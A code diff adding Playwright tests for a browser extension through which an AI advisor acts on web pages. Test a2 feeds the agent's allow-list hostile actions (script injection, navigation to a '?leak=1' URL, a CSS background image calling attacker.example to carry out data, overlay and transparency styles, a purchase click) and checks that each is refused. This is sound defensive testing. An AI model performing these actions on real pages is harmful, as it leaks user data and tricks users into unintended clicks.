@@ -161,6 +161,110 @@ test.describe('Milestone 2 Integration', () => {
     await page.close();
   });
 
+  test('a2. execute_actions is limited to the agent allow-list and never clicks purchase buttons', async () => {
+    // 'a' のテストで拡張は daemon に接続済み(設定は storage に残る)。
+    await expect.poll(() => daemonWss.getBridgeStatus().connected).toBe(true);
+    const page = await context.newPage();
+    await page.goto(pageUrl);
+    await page.evaluate(() => {
+      const b = document.createElement('button');
+      b.id = 'buy-now';
+      b.textContent = '今すぐ買う';
+      b.addEventListener('click', () => { window.__bought = true; });
+      document.body.append(b);
+    });
+    const run = (actions, extra = {}) => daemonWss.executeActions({ actions, urlContains: 'playground.html', ...extra });
+
+    // daemon が別の経路(manual)を名乗っても、拡張は execute_actions として縛る。
+    const blocked = await run(
+      [
+        { verb: 'injectScript', args: { code: 'window.__injected = true' } },
+        { verb: 'navigateTo', args: { url: 'https://example.com/?leak=1' } },
+        { verb: 'removeElement', args: { selector: '#buy-now' } },
+      ],
+      { source: 'manual' },
+    );
+    expect(blocked.results.map((r) => r.ok)).toEqual([false, false, false]);
+    expect(page.url()).toBe(pageUrl);
+    await expect(page.locator('#buy-now')).toHaveCount(1);
+
+    const res = await run([
+      { verb: 'setStyle', args: { selector: '#buy-now', styles: { backgroundColor: 'rgb(192, 0, 0)' } } },
+      { verb: 'clickElement', args: { selector: '#buy-now' } },
+    ]);
+    expect(res.results[0].ok).toBe(true);
+    await expect(page.locator('#buy-now')).toHaveCSS('background-color', 'rgb(192, 0, 0)');
+    expect(res.results[1]).toMatchObject({ ok: false, held: true });
+    expect(await page.evaluate(() => window.__bought === true)).toBe(false);
+
+    // setStyle は見た目を直す範囲だけ。外部参照(読んだ値の持ち出し口)と、要素を重ねる・動かす・透過させるプロパティは断る。
+    const styles = await run([
+      { verb: 'setStyle', args: { selector: '#buy-now', styles: { backgroundImage: 'url(https://attacker.example/?d=1)' } } },
+      { verb: 'setStyle', args: { selector: '#buy-now', styles: { position: 'fixed', zIndex: '9999' } } },
+      { verb: 'setStyle', args: { selector: '#buy-now', styles: { opacity: '0' } } },
+      { verb: 'setStyle', args: { selector: '#buy-now', styles: { marginTop: '-40px' } } },
+    ]);
+    expect(styles.results.map((r) => r.ok)).toEqual([false, false, false, false]);
+    expect(await page.$eval('#buy-now', (el) => [el.style.backgroundImage, el.style.position, el.style.opacity, el.style.marginTop])).toEqual(['', '', '', '']);
+
+    await page.close();
+  });
+
+  test('a3. resolve_feedback relay marks the memos done in the open tab and in storage', async () => {
+    await expect.poll(() => daemonWss.getBridgeStatus().connected).toBe(true);
+    const sw = await getServiceWorker(context);
+    const anchor = { selector: 'input[name="email"]', tag: 'input', role: 'textbox', text: '' };
+    await sw.evaluate(
+      async ({ scope, anchor }) => {
+        await chrome.storage.local.set({
+          aiAdvisorAnnotations: {
+            [scope]: [{ id: 'note-open', kind: 'note', createdAt: '2026-10-17T00:00:00Z', note: '枠を太く', intent: '', anchor }],
+            'http://127.0.0.1:1/closed': [{ id: 'note-closed', kind: 'note', createdAt: '2026-10-17T00:00:00Z', note: '閉じたページ', intent: '', anchor }],
+          },
+        });
+      },
+      { scope: pageUrl.split('?')[0], anchor },
+    );
+    // 同じページを2つのタブで開いている。どちらも対応済みになり、古い状態で送ったり上書きしたりしない。
+    const page = await context.newPage();
+    await page.goto(pageUrl);
+    const twin = await context.newPage();
+    await twin.goto(pageUrl);
+    for (const p of [page, twin]) await expect(p.locator('.bag-step-caption')).toHaveCount(1);
+    const tabId = await sw.evaluate(async (u) => (await chrome.tabs.query({})).find((t) => t.url === u)?.id, pageUrl);
+    // タブを開いた後に、このページへメモが増えた(別タブでの追加など)。開いているタブの一覧は古いまま。
+    await sw.evaluate(
+      async ({ scope, anchor }) => {
+        const map = (await chrome.storage.local.get('aiAdvisorAnnotations')).aiAdvisorAnnotations;
+        map[scope].push({ id: 'note-later', kind: 'note', createdAt: '2026-10-17T00:01:00Z', note: '後から', intent: '', anchor });
+        await chrome.storage.local.set({ aiAdvisorAnnotations: map });
+      },
+      { scope: pageUrl.split('?')[0], anchor },
+    );
+
+    const res = await daemonWss.request('mark_annotations_done', { tabId, ids: ['note-open', 'note-closed'] });
+    expect(res.marked.sort()).toEqual(['note-closed', 'note-open']);
+    for (const p of [page, twin]) await expect(p.locator('.bag-step-caption--done')).toContainText('AI');
+    const twinTabId = await sw.evaluate(async (u) => (await chrome.tabs.query({})).filter((t) => t.url === u).at(-1)?.id, pageUrl);
+    const collected = await sw.evaluate((t) => chrome.tabs.sendMessage(t, { type: 'COLLECT_PAGE_FEEDBACK' }), twinTabId);
+    // 対応済みのメモは送らない(後から増えた未対応のメモは送る)。
+    expect(collected.items.map((i) => i.id)).toEqual(['note-later']);
+    await twin.close();
+    const stored = await sw.evaluate(async () => (await chrome.storage.local.get('aiAdvisorAnnotations')).aiAdvisorAnnotations);
+    const all = Object.values(stored).flat();
+    for (const id of ['note-open', 'note-closed']) {
+      expect(all.find((a) => a.id === id)).toMatchObject({ forAI: false, doneAt: expect.any(String) });
+    }
+    // 古い一覧を持つタブの書き戻しで、後から増えたメモが消えない。
+    expect(all.find((a) => a.id === 'note-later')).toMatchObject({ note: '後から' });
+    expect(all.find((a) => a.id === 'note-later').doneAt).toBeUndefined();
+    // 該当メモを持たない拡張は ok:false を返す(複数の拡張が繋がる時に、持つ側の応答を daemon に採らせる)。
+    await expect(daemonWss.request('mark_annotations_done', { tabId, ids: ['missing'] })).rejects.toThrow(/No matching annotations/);
+
+    await sw.evaluate(() => chrome.storage.local.remove('aiAdvisorAnnotations'));
+    await page.close();
+  });
+
   test('b. Action execution and result recovery via the fallback CDP bridge CLI', async () => {
     const sw = await getServiceWorker(context);
     const extId = new URL(sw.url()).hostname;
